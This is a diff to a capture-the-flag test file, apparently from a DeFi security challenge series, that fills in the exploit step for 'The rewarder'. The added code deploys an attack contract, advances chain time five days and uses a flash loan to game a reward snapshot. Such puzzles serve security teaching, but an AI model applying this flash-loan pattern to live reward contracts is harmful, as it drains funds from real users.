@@ -66,6 +66,17 @@ describe('[Challenge] The rewarder', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        /*
+        Wait 5 days for the next round
+        Then, use flash loan to deposit and withdraw a large amount of DVT in the same transaction
+        */
+        
+       const AttackFactory = await ethers.getContractFactory("TheRewarderAttack", attacker)
+       const attackContract = await AttackFactory.deploy(this.flashLoanPool.address, this.rewarderPool.address)
+
+       const secondsToWait = 5 * 24 * 60 * 60 // 5 days
+       await ethers.provider.send("evm_increaseTime", [secondsToWait]);
+       await attackContract.attack()
     });
 
     after(async function () {
